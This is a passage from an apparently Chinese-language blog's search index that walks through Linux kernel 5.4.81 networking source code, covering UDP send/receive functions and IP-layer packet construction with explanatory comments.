ipc.opt-\u003eopt.is_strictroute)) { tos |= RTO_ONLINK; connected = 0; } 选择网卡设备, 多播见2.4.3 // 通过判断目的地址是否位于224.0.0.0/4 网段, 确定是否为多播 if (ipv4_is_multicast(daddr)) { // 设置设备索引为","date":"2021-03-21","objectID":"/kernel_net/:2:4","tags":["linux kernel","源码分析","网络"],"title":"linux内核(5.4.81)---网络模块源码分析","uri":"/kernel_net/"},{"categories":["linux内核源码分析"],"content":"2.4.1 udp_cmsg_send 通过相关patch进行分析得出以下结论. patch1 patch2: 添加GSO机制, 用户可以在一次系统调用中, 向同一目的ip发送多个报文 udp_cmsg_send // 遍历被切割成多个cmsg的msg-\u003econtrol int udp_cmsg_send(struct sock *sk, struct msghdr *msg, u16 *gso_size) { struct cmsghdr *cmsg; bool need_ip = false; int err; for_each_cmsghdr(cmsg, msg) { if (!CMSG_OK(msg, cmsg)) return -EINVAL; // 存在非UDP层控制信息, 下一步会进入ip_cmsg_send解析 if (cmsg-\u003ecmsg_level != SOL_UDP) { need_ip = true; continue; } err = __udp_cmsg_send(cmsg, gso_size); if (err) return err; } return need_ip; } udp_cmsg_send-\u003efor_each_cmsghdr(cmsg, msg) 将msg-\u003econtrol切割成多个cmsg, 具体逻辑: 获得第一个cmsg: cmsg = msg-\u003econtrol(msg-\u003econtrollen \u003e= sizeof(struct cmsghdr)), cmsghdr结构体包含__cmsg_data __flexarr 成员, 该成员为可变字符数组, 用来存储cmsg, 也就是说msg-\u003econtrol中的数据按照cmsghdr结构储存管理, 且cmsghdr结构可变 获得next_cmsg: next_cmsg = cmsg + (align)cmsg-\u003ecmsg_len(cmsg+cmsg-\u003ecmsg_len+1-msg-\u003econtrol \u003e msg-\u003emsg_controllen) #define for_each_cmsghdr(cmsg, msg) \\ for (cmsg = CMSG_FIRSTHDR(msg); \\ cmsg; \\ cmsg = CMSG_NXTHDR(msg, cmsg)) /* CMSG_FIRSTHDR: #define CMSG_FIRSTHDR(msg) __CMSG_FIRSTHDR((msg)-\u003emsg_control, (msg)-\u003emsg_controllen) #define __CMSG_FIRSTHDR(ctl,len) ((len) \u003e= sizeof(struct cmsghdr) ? \\ (struct cmsghdr *)(ctl) : \\ (struct cmsghdr *)NULL) */ /* CMSG_NXTHDR: #define CMSG_NXTHDR(mhdr, cmsg) cmsg_nxthdr((mhdr), (cmsg)) static inline struct cmsghdr * cmsg_nxthdr (struct msghdr *__msg, struct cmsghdr *__cmsg) { return __cmsg_nxthdr(__msg-\u003emsg_control, __msg-\u003emsg_controllen, __cmsg); } static inline struct cmsghdr * __cmsg_nxthdr(void *__ctl, __kernel_size_t __size, struct cmsghdr *__cmsg) { struct cmsghdr * __ptr; __ptr = (struct cmsghdr*)(((unsigned char *) __cmsg) + CMSG_ALIGN(__cmsg-\u003ecmsg_len)); if ((unsigned long)((char*)(__ptr+1) - (char *) __ctl) \u003e __size) return (struct cmsghdr *)0; return __ptr; } udp_cmsg_send-\u003e__udp_cmsg_send static int __udp_cmsg_send(struct cmsghdr *cmsg, u16 *gso_size) { switch (cmsg-\u003ecmsg_type) { case UDP_SEGMENT: if (cmsg-\u003ecmsg_len != CMSG_LEN(sizeof(__u16))) return -EINVAL; // 指定GSO报文大小, UDP_SEGMENT类型控制信息, 会在cmsg-\u003e__cmsg_data前两字节处指定gso_size *gso_size = *(__u16 *)CMSG_DATA(cmsg); return 0; default: return -EINVAL; } } ","date":"2021-03-21","objectID":"/kernel_net/:2:5","tags":["linux kernel","源码分析","网络"],"title":"linux内核(5.4.81)---网络模块源码分析","uri":"/kernel_net/"},{"categories":["linux内核源码分析"],"content":"2.4.2 TOS TOS(8bits) 通过填充flag标志位, 用以表示网络设备提供的服务类型(网络设备必须能够支持, 否则没有任何意义). 前3bits: 废弃, 无意义, 默认000 4bits: 1000 – minimize delay 最小延迟 0100 – maximize throughput 最大吞吐量 0010 – maximize reliability 最高可靠性 0001 – minimize monetary cost 最小费用 0000 – normal service 一般服务 末尾1bit: 无意义, 保留 ","date":"2021-03-21","objectID":"/kernel_net/:2:6","tags":["linux kernel","源码分析","网络"],"title":"linux内核(5.4.81)---网络模块源码分析","uri":"/kernel_net/"},{"categories":["linux内核源码分析"],"content":"2.4.3 多播/本地广播 设置多播/本地广播 多播可以参考这篇文章(多播技术)[https://www.huaweicloud.com/articles/6369165847f916e2f8a8638a480fb1f8.html], 总结概括如下: 多播用来实现一点对多点的传播, 适用于流媒体, 视频会议等场景 多播类似于广播, 使用特殊ip地址作为目的地址(224.0.0.0/4), 多播数据报文会被路由器抄写为多份, 发送至多个目标. 与广播不同的是, 多播只会向存在多播接收请求的子网转发信息. 对于接收者来说, 如果接收者希望接收某一多播信息, 会使用IGMP协议向本地服务器发送请求申请加入某多播组, 本地路由器会将该接收者加入多播组, 并将该组信息共享至相邻路由节点. 本地广播此处不再赘述 ","date":"2021-03-21","objectID":"/kernel_net/:2:7","tags":["linux kernel","源码分析","网络"],"title":"linux内核(5.4.81)---网络模块源码分析","uri":"/kernel_net/"},{"categories":["linux内核源码分析"],"content":"2.4.4 检查sock中路由信息是否过期 sk_dst_check struct dst_entry *sk_dst_check(struct sock *sk, u32 cookie) { struct dst_entry *dst = sk_dst_get(sk); if (dst \u0026\u0026 dst-\u003eobsolete \u0026\u0026 dst-\u003eops-\u003echeck(dst, cookie) == NULL) { sk_dst_reset(sk); dst_release(dst); return NULL; } return dst; } sk_dst_check-\u003esk_dst_get(获得路由信息) sk_dst_get(struct sock *sk) { struct dst_entry *dst; rcu_read_lock(); // 从sk-\u003esk_dst_cache去路由信息 dst = rcu_dereference(sk-\u003esk_dst_cache); // 引用数 +1 if (dst \u0026\u0026 !atomic_inc_not_zero(\u0026dst-\u003e__refcnt)) dst = NULL; rcu_read_unlock(); return dst; } sk_dst_check-\u003edst-\u003eops-\u003echeck(ipv4下调用ipv4_dst_check, 检查是否过期) static struct dst_entry *ipv4_dst_check(struct dst_entry *dst, u32 cookie) { struct rtable *rt = (struct rtable *) dst; /* All IPV4 dsts are created with -\u003eobsolete set to the value * DST_OBSOLETE_FORCE_CHK which forces validation calls down * into this function always. * * When a PMTU/redirect information update invalidates a route, * this is indicated by setting obsolete to DST_OBSOLETE_KILL or * DST_OBSOLETE_DEAD. */ // dst-\u003eobsolete 不等于DST_OBSOLETE_FORCE_CHK表示路由信息过期 if (dst-\u003eobsolete != DST_OBSOLETE_FORCE_CHK || rt_is_expired(rt)) return NULL; return dst; } ","date":"2021-03-21","objectID":"/kernel_net/:2:8","tags":["linux kernel","源码分析","网络"],"title":"linux内核(5.4.81)---网络模块源码分析","uri":"/kernel_net/"},{"categories":["linux内核源码分析"],"content":"2.4.5 udp_send_skb static int udp_send_skb(struct sk_buff *skb, struct flowi4 *fl4, struct inet_cork *cork) { struct sock *sk = skb-\u003esk; struct inet_sock *inet = inet_sk(sk); struct udphdr *uh; int err = 0; int is_udplite = IS_UDPLITE(sk); int offset = skb_transport_offset(skb); int len = skb-\u003elen - offset; int datalen = len - sizeof(*uh); __wsum csum = 0; /* * Create a UDP header */ // 填充udp头 uh = udp_hdr(skb); uh-\u003esource = inet-\u003einet_sport; uh-\u003edest = fl4-\u003efl4_dport; uh-\u003elen = htons(len); uh-\u003echeck = 0; // 检查是否满足GSO机制, 直接进入硬件校验 if (cork-\u003egso_size) { const int hlen = skb_network_header_len(skb) + sizeof(struct udphdr); if (hlen + cork-\u003egso_size \u003e cork-\u003efragsize) { kfree_skb(skb); return -EINVAL; } if (skb-\u003elen \u003e cork-\u003egso_size * UDP_MAX_SEGMENTS) { kfree_skb(skb); return -EINVAL; } if (sk-\u003esk_no_check_tx) { kfree_skb(skb); return -EINVAL; } if (skb-\u003eip_summed != CHECKSUM_PARTIAL || is_udplite || dst_xfrm(skb_dst(skb))) { kfree_skb(skb); return -EIO; } if (datalen \u003e cork-\u003egso_size) { skb_shinfo(skb)-\u003egso_size = cork-\u003egso_size; skb_shinfo(skb)-\u003egso_type = SKB_GSO_UDP_L4; skb_shinfo(skb)-\u003egso_segs = DIV_ROUND_UP(datalen, cork-\u003egso_size); } goto csum_partial; } // 进入UDP-LITE 校验和计算, 可通过指定校验长度容忍报文出错现象 if (is_udplite) /* UDP-Lite */ csum = udplite_csum(skb); // 不进行校验 else if (sk-\u003esk_no_check_tx) { /* UDP csum off */ // CHECKSUM_NONE指不需要校验 skb-\u003eip_summed = CHECKSUM_NONE; goto send; } else if (skb-\u003eip_summed == CHECKSUM_PARTIAL) { /* UDP hardware csum */ csum_partial: // CHECKSUM_PARTIAL表示硬件实现部分校验和计算(udp数据校验) udp4_hwcsum(skb, fl4-\u003esaddr, fl4-\u003edaddr); goto send; } else // 软件实现校验和计算(udp数据校验) csum = udp_csum(skb); /* add protocol-dependent pseudo-header */ // 设置伪ip头, 计算udp报文校验和与伪ip头的校验和 uh-\u003echeck = csum_tcpudp_magic(fl4-\u003esaddr, fl4-\u003edaddr, len, sk-\u003esk_protocol, csum); if (uh-\u003echeck == 0) uh-\u003echeck = CSUM_MANGLED_0; send: // 将skb传递至网络层(IP层), 详细见4.4 err = ip_send_skb(sock_net(sk), skb); if (err) { if (err == -ENOBUFS \u0026\u0026 !inet-\u003erecverr) { UDP_INC_STATS(sock_net(sk), UDP_MIB_SNDBUFERRORS, is_udplite); err = 0; } } else UDP_INC_STATS(sock_net(sk), UDP_MIB_OUTDATAGRAMS, is_udplite); return err; } ","date":"2021-03-21","objectID":"/kernel_net/:2:9","tags":["linux kernel","源码分析","网络"],"title":"linux内核(5.4.81)---网络模块源码分析","uri":"/kernel_net/"},{"categories":["linux内核源码分析"],"content":"2.4.6 udp_push_pending_frames int udp_push_pending_frames(struct sock *sk) { struct udp_sock *up = udp_sk(sk); struct inet_sock *inet = inet_sk(sk); struct flowi4 *fl4 = \u0026inet-\u003ecork.fl.u.ip4; struct sk_buff *skb; int err = 0; skb = ip_finish_skb(sk, fl4); if (!skb) goto out; err = udp_send_skb(skb, fl4, \u0026inet-\u003ecork.base); out: up-\u003elen = 0; up-\u003epending = 0; return err; } ","date":"2021-03-21","objectID":"/kernel_net/:2:10","tags":["linux kernel","源码分析","网络"],"title":"linux内核(5.4.81)---网络模块源码分析","uri":"/kernel_net/"},{"categories":["linux内核源码分析"],"content":"3. recv(运输层) 大多数api在send中已经提及, 不再次讲解 __sys_recvfrom -\u003e sock_recvmsg -\u003e sock_recvmsg_nosec -\u003e inet_recvmsg -\u003e udp_recvmsg (层层封装) int __sys_recvfrom(int fd, void __user *ubuf, size_t size, unsigned int flags, struct sockaddr __user *addr, int __user *addr_len) { ... err = sock_recvmsg(sock, \u0026msg, flags); if (err \u003e= 0 \u0026\u0026 addr != NULL) { // 将客户端地址返回给用户态 err2 = move_addr_to_user(\u0026address, msg.msg_namelen, addr, addr_len); if (err2 \u003c 0) err = err2; } ... ","date":"2021-03-21","objectID":"/kernel_net/:3:0","tags":["linux kernel","源码分析","网络"],"title":"linux内核(5.4.81)---网络模块源码分析","uri":"/kernel_net/"},{"categories":["linux内核源码分析"],"content":"2.1 udp_recvmsg int udp_recvmsg(struct sock *sk, struct msghdr *msg, size_t len, int noblock, int flags, int *addr_len) { struct inet_sock *inet = inet_sk(sk); DECLARE_SOCKADDR(struct sockaddr_in *, sin, msg-\u003emsg_name); struct sk_buff *skb; unsigned int ulen, copied; int off, err, peeking = flags \u0026 MSG_PEEK; int is_udplite = IS_UDPLITE(sk); bool checksum_valid = false; // 从socket错误队列接收错误信息 if (flags \u0026 MSG_ERRQUEUE) return ip_recv_error(sk, msg, len, addr_len); try_again: // MSG_PEEK表示预读, 此处获得预读长度 off = sk_peek_offset(sk, flags); // 从缓存队列中获得skb, 详细见2.1.1 skb = __skb_recv_udp(sk, flags, noblock, \u0026off, \u0026err); if (!skb) return err; // 获得skb内数据长度 ulen = udp_skb_len(skb); copied = len; // 如果待接收数据大于skb缓存数据, 截断输入 if (copied \u003e ulen - off) copied = ulen - off; else if (copied \u003c ulen) // 接收skb中所有数据 msg-\u003emsg_flags |= MSG_TRUNC; /* * If checksum is needed at all, try to do it while copying the * data. If the data is truncated, or if we only want a partial * coverage checksum (UDP-Lite), do it before the copy. */ // CHECKSUM_UNNECESSARY表示硬件已完成数据校验, 无需再次校验 // 待接收数据小于缓冲区数据\u0026开启预读机制\u0026开启udplite机制情况下如果skb需要进行校验则调用__udp_lib_checksum_complete进行校验 if (copied \u003c ulen || peeking || (is_udplite \u0026\u0026 UDP_SKB_CB(skb)-\u003epartial_cov)) { checksum_valid = udp_skb_csum_unnecessary(skb) || !__udp_lib_checksum_complete(skb); // 校验未通过丢弃数据 if (!checksum_valid) goto csum_copy_err; } // 如果校验成功或未开启校验则直接复制数据 if (checksum_valid || udp_skb_csum_unnecessary(skb)) { // 如果skb中数据都存在线性区域直接调用copy_linear_skb, 否则使用skb_copy_datagram_msg if (udp_skb_is_linear(skb)) err = copy_linear_skb(skb, copied, off, \u0026msg-\u003emsg_iter); else err = skb_copy_datagram_msg(skb, off, msg, copied); } // 此处代码对全部数据做校验 else { // 在复制数据时做完整性校验 err = skb_copy_and_csum_datagram_msg(skb, off, msg); if (err == -EINVAL) goto csum_copy_err; } // 发生错误释放skb, 直接返回 if (unlikely(err)) { if (!peeking) { atomic_inc(\u0026sk-\u003esk_drops); UDP_INC_STATS(sock_net(sk), UDP_MIB_INERRORS, is_udplite); } kfree_skb(skb); return err; } if (!peeking) UDP_INC_STATS(sock_net(sk), UDP_MIB_INDATAGRAMS, is_udplite); sock_recv_ts_and_drops(msg, sk, skb); // 根据skb填充客户端数据 /* Copy the address. */ if (sin) { sin-\u003esin_family = AF_INET; sin-\u003esin_port = udp_hdr(skb)-\u003esource; sin-\u003esin_addr.s_addr = ip_hdr(skb)-\u003esaddr; memset(sin-\u003esin_zero, 0, sizeof(sin-\u003esin_zero)); *addr_len = sizeof(*sin); // 涉及bpf if (cgroup_bpf_enabled) BPF_CGROUP_RUN_PROG_UDP4_RECVMSG_LOCK(sk, (struct sockaddr *)sin); } // 解析控制信息 if (udp_sk(sk)-\u003egro_enabled) udp_cmsg_recv(msg, sk, skb); if (inet-\u003ecmsg_flags) ip_cmsg_recv_offset(msg, sk, skb, sizeof(struct udphdr), off); err = copied; if (flags \u0026 MSG_TRUNC) // 如果开启MSG_TRUNC, 会接收skb中全部数据（在用户缓冲区最大处截断） err = ulen; skb_consume_udp(sk, skb, peeking ? -err : err); return err; csum_copy_err: if (!__sk_queue_drop_skb(sk, \u0026udp_sk(sk)-\u003ereader_queue, skb, flags, udp_skb_destructor)) { UDP_INC_STATS(sock_net(sk), UDP_MIB_CSUMERRORS, is_udplite); UDP_INC_STATS(sock_net(sk), UDP_MIB_INERRORS, is_udplite); } kfree_skb(skb); /* starting over for a new packet, but check if we need to yield */ cond_resched(); msg-\u003emsg_flags \u0026= ~MSG_TRUNC; goto try_again; } ","date":"2021-03-21","objectID":"/kernel_net/:3:1","tags":["linux kernel","源码分析","网络"],"title":"linux内核(5.4.81)---网络模块源码分析","uri":"/kernel_net/"},{"categories":["linux内核源码分析"],"content":"2.1.1 __skb_recv_udp struct sk_buff *__skb_recv_udp(struct sock *sk, unsigned int flags, int noblock, int *off, int *err) { struct sk_buff_head *sk_queue = \u0026sk-\u003esk_receive_queue; struct sk_buff_head *queue; struct sk_buff *last; long timeo; int error; // 获得缓存队列 queue = \u0026udp_sk(sk)-\u003ereader_queue; // 确定是否为非阻塞IO flags |= noblock ? MSG_DONTWAIT : 0; // 返回阻塞IO时间戳 timeo = sock_rcvtimeo(sk, flags \u0026 MSG_DONTWAIT); do { struct sk_buff *skb; // 清空错误报告 error = sock_error(sk); if (error) break; error = -EAGAIN; do { // 禁止CPU软中断 spin_lock_bh(\u0026queue-\u003elock); // 尝试获得skb, 详细见2.1.1.1 skb = __skb_try_recv_from_queue(sk, queue, flags, udp_skb_destructor, off, err, \u0026last); if (skb) { // 获得skb后开启软中断 spin_unlock_bh(\u0026queue-\u003elock); return skb; } // 获取skb失败后, 无锁判断sock接收队列是否为空 if (skb_queue_empty_lockless(sk_queue)) { spin_unlock_bh(\u0026queue-\u003elock); goto busy_check; } /* refill the reader queue and walk it again * keep both queues locked to avoid re-acquiring * the sk_receive_queue lock if fwd memory scheduling * is needed. */ spin_lock(\u0026sk_queue-\u003elock); // 链接sk_queue进入queue skb_queue_splice_tail_init(sk_queue, queue); // 再次尝试获取skb skb = __skb_try_recv_from_queue(sk, queue, flags, udp_skb_dtor_locked, off, err, \u0026last); spin_unlock(\u0026sk_queue-\u003elock); spin_unlock_bh(\u0026queue-\u003elock); if (skb) return skb; busy_check: if (!sk_can_busy_loop(sk)) break; sk_busy_loop(sk, flags \u0026 MSG_DONTWAIT); } while (!skb_queue_empty_lockless(sk_queue)); // 直到sk_queue为空, 跳出循环 /* sk_queue is empty, reader_queue may contain peeked packets */ } while (timeo \u0026\u0026 !__skb_wait_for_more_packets(sk, \u0026error, \u0026timeo, (struct sk_buff *)sk_queue)); // 如果sock接收队列sk_queue为空, 且需要等待, 在此处等待 *err = error; return NULL; } ","date":"2021-03-21","objectID":"/kernel_net/:3:2","tags":["linux kernel","源码分析","网络"],"title":"linux内核(5.4.81)---网络模块源码分析","uri":"/kernel_net/"},{"categories":["linux内核源码分析"],"content":"2.1.1.1 __skb_try_recv_from_queue struct sk_buff *__skb_try_recv_from_queue(struct sock *sk, struct sk_buff_head *queue, unsigned int flags, void (*destructor)(struct sock *sk, struct sk_buff *skb), int *off, int *err, struct sk_buff **last) { bool peek_at_off = false; struct sk_buff *skb; int _off = 0; if (unlikely(flags \u0026 MSG_PEEK \u0026\u0026 *off \u003e= 0)) { peek_at_off = true; _off = *off; } *last = queue-\u003eprev; // 遍历队列 skb_queue_walk(queue, skb) { if (flags \u0026 MSG_PEEK) { // 如果预读的字节数大于skb数据长度, 则更新待预读字节数且更换skb if (peek_at_off \u0026\u0026 _off \u003e= skb-\u003elen \u0026\u0026 (_off || skb-\u003epeeked)) { _off -= skb-\u003elen; continue; } // skb非空, 设置为预读模式 if (!skb-\u003elen) { skb = skb_set_peeked(skb); if (IS_ERR(skb)) { *err = PTR_ERR(skb); return NULL; } } refcount_inc(\u0026skb-\u003eusers); } else { // 将skb从队列中取出 __skb_unlink(skb, queue); // 如果定义了销毁函数则调用 if (destructor) destructor(sk, skb); } *off = _off; return skb; } return NULL; } ","date":"2021-03-21","objectID":"/kernel_net/:3:3","tags":["linux kernel","源码分析","网络"],"title":"linux内核(5.4.81)---网络模块源码分析","uri":"/kernel_net/"},{"categories":["linux内核源码分析"],"content":"4. IP(网络层) ","date":"2021-03-21","objectID":"/kernel_net/:4:0","tags":["linux kernel","源码分析","网络"],"title":"linux内核(5.4.81)---网络模块源码分析","uri":"/kernel_net/"},{"categories":["linux内核源码分析"],"content":"4.1 ip_cmsg_send 将cmsg中的控制信息, 保存至ipc(可以根据控制信息, 自定义socket和ip层面配置) int ip_cmsg_send(struct sock *sk, struct msghdr *msg, struct ipcm_cookie *ipc, bool allow_ipv6) { int err, val; struct cmsghdr *cmsg; struct net *net = sock_net(sk); for_each_cmsghdr(cmsg, msg) { if (!CMSG_OK(msg, cmsg)) return -EINVAL; if (cmsg-\u003ecmsg_level == SOL_SOCKET) { // 修改socket层面的配置 err = __sock_cmsg_send(sk, msg, cmsg, \u0026ipc-\u003esockc); if (err) return err; continue; } if (cmsg-\u003ecmsg_level != SOL_IP) continue; switch (cmsg-\u003ecmsg_type) { case IP_RETOPTS: // 获得ip选项 err = cmsg-\u003ecmsg_len - sizeof(struct cmsghdr); /* Our caller is responsible for freeing ipc-\u003eopt */ err = ip_options_get(net, \u0026ipc-\u003eopt, CMSG_DATA(cmsg), err \u003c 40 ? err : 40); if (err) return err; break; case IP_PKTINFO: // 通过控制信息修改源ip { struct in_pktinfo *info; if (cmsg-\u003ecmsg_len != CMSG_LEN(sizeof(struct in_pktinfo))) return -EINVAL; info = (struct in_pktinfo *)CMSG_DATA(cmsg); if (info-\u003eipi_ifindex) ipc-\u003eoif = info-\u003eipi_ifindex; ipc-\u003eaddr = info-\u003eipi_spec_dst.s_addr; break; } case IP_TTL: // 自定义TTL if (cmsg-\u003ecmsg_len != CMSG_LEN(sizeof(int))) return -EINVAL; val = *(int *)CMSG_DATA(cmsg); if (val \u003c 1 || val \u003e 255) return -EINVAL; ipc-\u003ettl = val; break; case IP_TOS: // 自定义TOS if (cmsg-\u003ecmsg_len == CMSG_LEN(sizeof(int))) val = *(int *)CMSG_DATA(cmsg); else if (cmsg-\u003ecmsg_len == CMSG_LEN(sizeof(u8))) val = *(u8 *)CMSG_DATA(cmsg); else return -EINVAL; if (val \u003c 0 || val \u003e 255) return -EINVAL; ipc-\u003etos = val; ipc-\u003epriority = rt_tos2priority(ipc-\u003etos); break; default: return -EINVAL; } } return 0; } ","date":"2021-03-21","objectID":"/kernel_net/:4:1","tags":["linux kernel","源码分析","网络"],"title":"linux内核(5.4.81)---网络模块源码分析","uri":"/kernel_net/"},{"categories":["linux内核源码分析"],"content":"4.2 ip_make_skb truct sk_buff *ip_make_skb(struct sock *sk, struct flowi4 *fl4, int getfrag(void *from, char *to, int offset, int len, int odd, struct sk_buff *skb), void *from, int length, int transhdrlen, struct ipcm_cookie *ipc, struct rtable **rtp, struct inet_cork *cork, unsigned int flags) { /* struct sk_buff_head { /* These two members must be first. */ struct sk_buff *next; struct sk_buff *prev; __u32 qlen; spinlock_t lock; }; */ struct sk_buff_head queue; int err; // 路径探测数据包不传输数据, 直接返回 if (flags \u0026 MSG_PROBE) return NULL; // 创建空闲队列 __skb_queue_head_init(\u0026queue); // 伪造cork cork-\u003eflags = 0; cork-\u003eaddr = 0; cork-\u003eopt = NULL; // 初始化cork, 见4.2.1 err = ip_setup_cork(sk, cork, ipc, rtp); if (err) return ERR_PTR(err); // 使用队列保存skb, skb组织待传输数据, 详细见4.3.1 err = __ip_append_data(sk, fl4, \u0026queue, cork, \u0026current-\u003etask_frag, getfrag, from, length, transhdrlen, flags); if (err) { __ip_flush_pending_frames(sk, \u0026queue, cork); return ERR_PTR(err); } // 取出队列中的skb, 设置ip选项, 并链接, 返回一个skb, 详细见4.2.2 return __ip_make_skb(sk, fl4, \u0026queue, cork); } ","date":"2021-03-21","objectID":"/kernel_net/:4:2","tags":["linux kernel","源码分析","网络"],"title":"linux内核(5.4.81)---网络模块源码分析","uri":"/kernel_net/"},{"categories":["linux内核源码分析"],"content":"4.2.1 ip_setup_cork static int ip_setup_cork(struct sock *sk, struct inet_cork *cork, struct ipcm_cookie *ipc, struct rtable **rtp) { struct ip_options_rcu *opt; struct rtable *rt; rt = *rtp; if (unlikely(!rt)) return -EFAULT; /* * setup for corking. */ opt = ipc-\u003eopt; if (opt) { if (!cork-\u003eopt) { // 为cork-\u003eopt分配空间, 最大容纳sizeof(struct ip_options) + 40 bytes cork-\u003eopt = kmalloc(sizeof(struct ip_options) + 40, sk-\u003esk_allocation); if (unlikely(!cork-\u003eopt)) return -ENOBUFS; } // 缓存opt至cork-\u003eopt memcpy(cork-\u003eopt, \u0026opt-\u003eopt, sizeof(struct ip_options) + opt-\u003eopt.optlen); cork-\u003eflags |= IPCORK_OPT; cork-\u003eaddr = ipc-\u003eaddr; } // 设置报文分段长度, 开启pmtu探测时调用dst-\u003eops-\u003emtu(dst)获得mtu, 否则从网络设备获得mtu cork-\u003efragsize = ip_sk_use_pmtu(sk) ? dst_mtu(\u0026rt-\u003edst) : READ_ONCE(rt-\u003edst.dev-\u003emtu); // mtu \u003e= IPV4_MIN_MTU if (!inetdev_valid_mtu(cork-\u003efragsize)) return -ENETUNREACH; cork-\u003egso_size = ipc-\u003egso_size; // 设置路由 cork-\u003edst = \u0026rt-\u003edst; /* We stole this route, caller should not release it. */ *rtp = NULL; // 基础配置, cork最终会拿到所有ip配置 // cork-\u003elength表示skb已包含数据 cork-\u003elength = 0; cork-\u003ettl = ipc-\u003ettl; cork-\u003etos = ipc-\u003etos; cork-\u003emark = ipc-\u003esockc.mark; cork-\u003epriority = ipc-\u003epriority; cork-\u003etransmit_time = ipc-\u003esockc.transmit_time; cork-\u003etx_flags = 0; sock_tx_timestamp(sk, ipc-\u003esockc.tsflags, \u0026cork-\u003etx_flags); return 0; } ","date":"2021-03-21","objectID":"/kernel_net/:4:3","tags":["linux kernel","源码分析","网络"],"title":"linux内核(5.4.81)---网络模块源码分析","uri":"/kernel_net/"},{"categories":["linux内核源码分析"],"content":"4.2.2 __ip_make_skb struct sk_buff *__ip_make_skb(struct sock *sk, struct flowi4 *fl4, struct sk_buff_head *queue, struct inet_cork *cork) { struct sk_buff *skb, *tmp_skb; struct sk_buff **tail_skb; struct inet_sock *inet = inet_sk(sk); struct net *net = sock_net(sk); struct ip_options *opt = NULL; struct rtable *rt = (struct rtable *)cork-\u003edst; struct iphdr *iph; __be16 df = 0; __u8 ttl; // 取出第一个skb skb = __skb_dequeue(queue); if (!skb) goto out; // 定位skb非线性区域 tail_skb = \u0026(skb_shinfo(skb)-\u003efrag_list); /* move skb-\u003edata to ip header from ext header */ // 更新skb-\u003edata指向ip头 if (skb-\u003edata \u003c skb_network_header(skb)) __skb_pull(skb, skb_network_offset(skb)); // 依次取出skb, 使用skb_shinfo(skb)-\u003efrag_list作为指针将所有skb链接起来, 同时由链表头skb统计数据长度信息 while ((tmp_skb = __skb_dequeue(queue)) != NULL) { __skb_pull(tmp_skb, skb_network_header_len(skb)); *tail_skb = tmp_skb; tail_skb = \u0026(tmp_skb-\u003enext); skb-\u003elen += tmp_skb-\u003elen; skb-\u003edata_len += tmp_skb-\u003elen; skb-\u003etruesize += tmp_skb-\u003etruesize; tmp_skb-\u003edestructor = NULL; tmp_skb-\u003esk = NULL; } /* Unless user demanded real pmtu discovery (IP_PMTUDISC_DO), we allow * to fragment the frame generated here. No matter, what transforms * how transforms change size of the packet, it will come out. */ // 设置是否开启动态mtu探测 skb-\u003eignore_df = ip_sk_ignore_df(sk); /* DF bit is set when we want to see DF on outgoing frames. * If ignore_df is set too, we still allow to fragment this frame * locally. */ if (inet-\u003epmtudisc == IP_PMTUDISC_DO || inet-\u003epmtudisc == IP_PMTUDISC_PROBE || (skb-\u003elen \u003c= dst_mtu(\u0026rt-\u003edst) \u0026\u0026 ip_dont_fragment(sk, \u0026rt-\u003edst))) df = htons(IP_DF); if (cork-\u003eflags \u0026 IPCORK_OPT) opt = cork-\u003eopt; if (cork-\u003ettl != 0) ttl = cork-\u003ettl; else if (rt-\u003ert_type == RTN_MULTICAST) ttl = inet-\u003emc_ttl; else ttl = ip_select_ttl(inet, \u0026rt-\u003edst); // 填充skb线性区域的ip头信息 iph = ip_hdr(skb); iph-\u003eversion = 4; iph-\u003eihl = 5; iph-\u003etos = (cork-\u003etos != -1) ? cork-\u003etos : inet-\u003etos; iph-\u003efrag_off = df; iph-\u003ettl = ttl; iph-\u003eprotocol = sk-\u003esk_protocol; ip_copy_addrs(iph, fl4); ip_select_ident(net, skb, sk); if (opt) { iph-\u003eihl += opt-\u003eoptlen\u003e\u003e2; ip_options_build(skb, opt, cork-\u003eaddr, rt, 0); } skb-\u003epriority = (cork-\u003etos != -1) ? cork-\u003epriority: sk-\u003esk_priority; skb-\u003emark = cork-\u003emark; skb-\u003etstamp = cork-\u003etransmit_time; /* * Steal rt from cork.dst to avoid a pair of atomic_inc/atomic_dec * on dst refcount */ cork-\u003edst = NULL; skb_dst_set(skb, \u0026rt-\u003edst); if (iph-\u003eprotocol == IPPROTO_ICMP) icmp_out_count(net, ((struct icmphdr *) skb_transport_header(skb))-\u003etype); ip_cork_release(cork); out: return skb; } ","date":"2021-03-21","objectID":"/kernel_net/:4:4","tags":["linux kernel","源码分析","网络"],"title":"linux内核(5.4.81)---网络模块源码分析","uri":"/kernel_net/"},{"categories":["linux内核源码分析"],"content":"4.3 ip_append_data int ip_append_data(struct sock *sk, struct flowi4 *fl4, int getfrag(void *from, char *to, int offset, int len, int odd, struct sk_buff *skb), void *from, int length, int transhdrlen, struct ipcm_cookie *ipc, struct rtable **rtp, unsigned int flags) { struct inet_sock *inet = inet_sk(sk); int err; // 忽略探测包 if (flags\u0026MSG_PROBE) return 0; // 队列为空时, 初始化cork if (skb_queue_empty(\u0026sk-\u003esk_write_queue)) { err = ip_setup_cork(sk, \u0026inet-\u003ecork.base, ipc, rtp); if (err) return err; } else { transhdrlen = 0; } return __ip_append_data(sk, fl4, \u0026sk-\u003esk_write_queue, \u0026inet-\u003ecork.base, sk_page_frag(sk), getfrag, from, length, transhdrlen, flags); } ","date":"2021-03-21","objectID":"/kernel_net/:4:5","tags":["linux kernel","源码分析","网络"],"title":"linux内核(5.4.81)---网络模块源码分析","uri":"/kernel_net/"},{"categories":["linux内核源码分析"],"content":"4.3.1 __ip_append_data static int __ip_append_data(struct sock *sk, struct flowi4 *fl4, struct sk_buff_head *queue, struct inet_cork *cork, struct page_frag *pfrag, int getfrag(void *from, char *to, int offset, int len, int odd, struct sk_buff *skb), void *from, int length, int transhdrlen, unsigned int flags) { struct inet_sock *inet = inet_sk(sk); struct ubuf_info *uarg = NULL; struct sk_buff *skb; struct ip_options *opt = cork-\u003eopt; int hh_len; int exthdrlen; int mtu; int copy; int err; int offset = 0; unsigned int maxfraglen, fragheaderlen, maxnonfragsize; int csummode = CHECKSUM_NONE; struct rtable *rt = (struct rtable *)cork-\u003edst; unsigned int wmem_alloc_delta = 0; bool paged, extra_uref = false; u32 tskey = 0; // 取出队列尾部的skb(这个skb有可能存在部分空闲缓冲区, 可以继续保存数据) skb = skb_peek_tail(queue); // skb为空(第一个skb), rt-\u003edst.header_len为拓展头长度 exthdrlen = !skb ? rt-\u003edst.header_len : 0; // 如果开启GSO机制, mtu可直接取最大值, 否则取最大报文分段长度 